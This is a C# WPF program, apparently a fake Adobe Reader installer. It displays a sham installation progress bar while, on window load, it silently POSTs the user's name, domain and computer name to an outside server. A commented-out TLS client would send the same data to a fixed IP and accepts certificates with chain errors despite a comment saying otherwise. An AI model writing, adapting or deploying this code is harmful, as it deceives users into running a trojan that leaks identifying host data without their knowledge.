using System;
using System.Text;
using System.Windows;
using System.Windows.Threading;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using System.IO;

namespace FakeAdobeReaderInstaller
{
    public partial class MainWindow : Window
    {
        private DispatcherTimer disTimer = new DispatcherTimer();
        private int i = 0;
        int delta = 0;

        public MainWindow()
        {
            InitializeComponent();
            imgTick.Visibility = Visibility.Hidden;
            btnFinish.Visibility = Visibility.Hidden;
            page2.Visibility = Visibility.Hidden;
            prgbar.Value = 0;

            disTimer.Tick += new EventHandler(StartInstall);
            disTimer.Interval = new TimeSpan(0, 0, 0, 4);
            disTimer.Start();
        }

        private void StartInstall(Object o, EventArgs e)
        {
            page1.Visibility = Visibility.Hidden;
            page2.Visibility = Visibility.Visible;

            disTimer.Tick -= StartInstall;
            disTimer.Tick += new EventHandler(AnimInstall);
            disTimer.Interval = new TimeSpan(0, 0, 0, 0, 500);
        }

        private void AnimInstall(Object o, EventArgs e)
        {
            Random rnd = new Random();

            this.Dispatcher.Invoke(() =>
            {
                txtInstalling.Text = i.ToString() + "%";
                prgbar.Value = ++i;

                disTimer.Interval = new TimeSpan(0, 0, 0, 0, rnd.Next(1, 3) * (100 + delta));
                if (i == 50)
                {
                    delta = 500;
                    txtStatus.Text = "Installing...";
                }
                else if (i == 100)
                {
                    disTimer.Stop();

                    txtStatus.Text = "Installation complete";
                    imgTick.Visibility = Visibility.Visible;
                    btnFinish.Visibility = Visibility.Visible;
                    txtInstalling.Visibility = Visibility.Hidden;
                }
            });
        }

        private void button_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            //RunClient("192.168.1.106", "test", 10023);
            SendPOST("https://asd.com/index.php");
        }

        public static bool ValidateServerCertificate(
              object sender,
              X509Certificate certificate,
              X509Chain chain,
              SslPolicyErrors sslPolicyErrors)
        {
            //if (sslPolicyErrors == SslPolicyErrors.None)
            if (sslPolicyErrors == SslPolicyErrors.RemoteCertificateChainErrors)
                return true;

            // Do not allow this client to communicate with unauthenticated servers.
            return false;
        }
        public static void RunClient(string machineName, string serverName, int port)
        {

            TcpClient client = new TcpClient(machineName, port);
            SslStream sslStream = new SslStream(
                client.GetStream(),
                false,
                new RemoteCertificateValidationCallback(ValidateServerCertificate),
                null
                );
            // The server name must match the name on the server certificate.
            try
            {
                sslStream.AuthenticateAsClient(serverName, new X509CertificateCollection(), SslProtocols.Tls, true);
            }
            catch (AuthenticationException e)
            {
                client.Close();
                return;
            }

            string keyExchange = "Error";
            switch (sslStream.KeyExchangeAlgorithm)
            {
                case ExchangeAlgorithmType.None:
                    keyExchange = "None";
                    break;
                case ExchangeAlgorithmType.DiffieHellman:
                    keyExchange = "DiffieHellman";
                    break;
                case ExchangeAlgorithmType.RsaKeyX:
                    keyExchange = "RSA exchange algorithm";
                    break;
                case ExchangeAlgorithmType.RsaSign:
                    keyExchange = "RSA signature algorithm";
                    break;
                case (ExchangeAlgorithmType)44550:
                    keyExchange = "ECDH Ephemeral";
                    break;
            }

            byte[] msg_username = Encoding.UTF8.GetBytes(System.Environment.GetEnvironmentVariable("USERNAME", EnvironmentVariableTarget.Process) + ';');
            byte[] msg_userdomain = Encoding.UTF8.GetBytes(System.Environment.GetEnvironmentVariable("USERDOMAIN", EnvironmentVariableTarget.Process) + ';');
            byte[] msg_computername = Encoding.UTF8.GetBytes(System.Environment.GetEnvironmentVariable("COMPUTERNAME", EnvironmentVariableTarget.Process) + '\0');

            sslStream.Write(msg_username);
            sslStream.Write(msg_userdomain);
            sslStream.Write(msg_computername);
            sslStream.Flush();

            client.Close();
        }
        private void SendPOST(string serverName)
        {
            string msg_username = System.Environment.GetEnvironmentVariable("USERNAME", EnvironmentVariableTarget.Process);
            string msg_userdomain = System.Environment.GetEnvironmentVariable("USERDOMAIN", EnvironmentVariableTarget.Process);
            string msg_computername = System.Environment.GetEnvironmentVariable("COMPUTERNAME", EnvironmentVariableTarget.Process);
            string strData = "s=3&username=" + msg_username + "&userdomain=" + msg_userdomain + "&computername=" + msg_computername;
            byte[] data = Encoding.ASCII.GetBytes(strData);

            WebRequest request = WebRequest.Create(serverName);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            using (Stream stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }
        }
    }
}
